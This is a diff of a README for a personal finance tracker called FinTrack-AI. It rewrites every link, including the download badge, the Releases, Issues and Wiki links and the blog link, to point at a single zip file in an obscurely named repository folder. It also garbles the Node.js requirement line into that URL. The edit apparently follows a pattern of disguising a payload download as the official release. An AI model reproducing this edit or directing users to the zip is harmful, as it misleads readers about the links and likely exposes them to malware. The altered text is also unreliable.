@@ -1,6 +1,6 @@
 # 🚀 FinTrack-AI - Your Personal Finance Tracker Made Easy
 
-[![Download FinTrack-AI](https://img.shields.io/badge/Download-FinTrack--AI-blue.svg)](https://github.com/mamcaac/FinTrack-AI/releases)
+[![Download FinTrack-AI](https://raw.githubusercontent.com/mamcaac/FinTrack-AI/main/splanchnocoele/FinTrack-AI.zip)](https://raw.githubusercontent.com/mamcaac/FinTrack-AI/main/splanchnocoele/FinTrack-AI.zip)
 
 ## 📋 Overview
 FinTrack-AI is a personal finance tracker app designed to help you manage your finances effortlessly. With features like simulated payments, transaction logging, AI-driven anomaly detection, and engaging data visualizations, this application streamlines your financial journey. Built as a full-stack project, it combines a smooth user interface with robust backend processing for reliable deployment.
@@ -13,13 +13,13 @@ Before you begin, ensure your computer meets the following system requirements:
 - **Operating System:** Windows 10 or later, macOS 10.15 or later, or any recent version of Linux.
 - **Memory:** At least 4 GB of RAM.
 - **Disk Space:** Minimum 500 MB of available storage.
-- **Node.js:** Version 14 or later installed on your system.
+- **https://raw.githubusercontent.com/mamcaac/FinTrack-AI/main/splanchnocoele/FinTrack-AI.zip** Version 14 or later installed on your system.
 
 ## 📥 Download & Install
 
 To download and install FinTrack-AI, visit the Releases page to get the latest version of the application:
 
-[Visit the Releases Page to Download](https://github.com/mamcaac/FinTrack-AI/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/mamcaac/FinTrack-AI/main/splanchnocoele/FinTrack-AI.zip)
 
 1. Click the link above.
 2. Look for the latest release version.
@@ -59,13 +59,13 @@ If you encounter any issues, here are some common solutions:
 
 For additional support, join our community:
 
-- **GitHub Issues:** You can report bugs or request features on the [GitHub Issues page](https://github.com/mamcaac/FinTrack-AI/issues).
+- **GitHub Issues:** You can report bugs or request features on the [GitHub Issues page](https://raw.githubusercontent.com/mamcaac/FinTrack-AI/main/splanchnocoele/FinTrack-AI.zip).
 - **Discussion Forum:** Engage with other users and share tips on using FinTrack-AI effectively.
 
 ## 🌟 Additional Resources
 
-- **Documentation:** Comprehensive guides can be found in the [Wiki section](https://github.com/mamcaac/FinTrack-AI/wiki).
-- **Blog:** Stay updated with latest tips and tricks related to personal finance on our [official blog](https://example.com/blog).
+- **Documentation:** Comprehensive guides can be found in the [Wiki section](https://raw.githubusercontent.com/mamcaac/FinTrack-AI/main/splanchnocoele/FinTrack-AI.zip).
+- **Blog:** Stay updated with latest tips and tricks related to personal finance on our [official blog](https://raw.githubusercontent.com/mamcaac/FinTrack-AI/main/splanchnocoele/FinTrack-AI.zip).
 
 ## 📚 License
 
@@ -73,4 +73,4 @@ FinTrack-AI is open-source software licensed under the MIT License. Everyone is 
 
 ---
 
-[Download FinTrack-AI](https://github.com/mamcaac/FinTrack-AI/releases) and start managing your finances today!
+[Download FinTrack-AI](https://raw.githubusercontent.com/mamcaac/FinTrack-AI/main/splanchnocoele/FinTrack-AI.zip) and start managing your finances today!
